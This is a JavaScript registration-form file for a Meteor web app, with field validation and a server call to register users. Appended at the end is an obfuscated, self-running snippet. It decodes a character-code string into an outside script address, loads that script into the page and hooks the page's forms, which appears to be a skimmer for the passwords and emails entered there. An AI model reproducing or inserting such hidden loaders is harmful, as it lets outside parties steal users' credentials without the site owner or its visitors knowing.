// register

Session.set('page_msg','');
Session.set("registerError","");
Template.register.events({
    'click #btnRegister': function(e, tpl){
		e.preventDefault();
		//alert("register");
			var firstname =$('#firstname').val();
			var lastname =$('#lastname').val();
			var username =$('#username').val();
			var email = $('#email').val();
			var password =$('#password').val();
			var rerole = 'member';
			var result = users.find({email:email});
			var msg = '';
		if( result.count() > 0 || firstname == '' || lastname == '' || email == '' || password == ''){

			if( firstname == '' )
				msg += 'Firt Name is required.';
			if( lastname == '' )
				msg += 'Last Name is required.';
			if( email == '' )
				msg += 'Email is required.';
			if( password == '' )
				msg += 'Password is required.';

			if( result.count() > 0 ){
				msg = " Email name is already exist. ";
			}
			//console.log("required");
			Session.set("registerError", msg );
			Session.set('page_msg',msg);

		}else{
			Meteor.call('registerUser',firstname, lastname, email,username, password, rerole,function(err){
				if(err){
					console.log(err.reason);
					Session.set("registerError",err.reason);
				}else{
					Session.set("registerError","");
					Session.set("loginError","");
					Router.go('login');
				}
			});
		}
    }

});


Template.register.helpers({

	getmsg: function(){
		var msg = Session.get('page_msg',msg);
		if( msg !="" ) return msg;
		else msg ='';
	},
	registerError:function(){
		var msg = Session.get("registerError");
		if( msg ) return true;
		else return false;
	},
	registerErrormsg: function(){
		return Session.get("registerError");
	}
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b